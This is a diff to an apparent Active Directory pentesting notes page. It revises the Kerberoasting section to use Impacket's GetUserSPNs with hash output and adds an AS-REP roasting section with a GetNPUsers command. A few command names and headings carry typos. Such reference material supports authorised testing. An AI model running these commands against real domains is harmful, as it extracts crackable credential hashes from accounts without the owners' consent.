@@ -89,13 +89,13 @@ sudo ldapdomaindump ldaps://DC_IP -u 'DOMAIN\USER' -p 'PASS' -o DIRECTORY
 
 
 
-### Kerberostable Users
+### Get Kerberostable Users
 
 Identify user accounts with SPN (Service Principal Name) configured, exploitable via Kerberoasting.
 
-{% code title="Impacket's GetNPUsers.py" %}
+{% code title="Impacket" overflow="wrap" %}
 ```bash
-./GetNPUUsers.py $DOMAIN/ -dc-ip $DC_IP 
+impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN.local/ -outputfile hashes.kerberoast
 ```
 {% endcode %}
 
@@ -111,7 +111,17 @@ All the user in the output may be vulnerable to **AS-REP Reasting**.
 [as-rep-roasting.md](../ad-post-compromise-attacks/as-rep-roasting.md)
 {% endcontent-ref %}
 
+### Get AS-REP Roastable users
 
+{% code title="Impacket's GetNPUsers.py" %}
+```bash
+impacket-GetNPUUsers.py $DOMAIN/ -dc-ip $DC_IP 
+```
+{% endcode %}
+
+{% content-ref url="../ad-post-compromise-attacks/as-rep-roasting.md" %}
+[as-rep-roasting.md](../ad-post-compromise-attacks/as-rep-roasting.md)
+{% endcontent-ref %}
 
 ### Get Objs from AD Recycle Bin
 
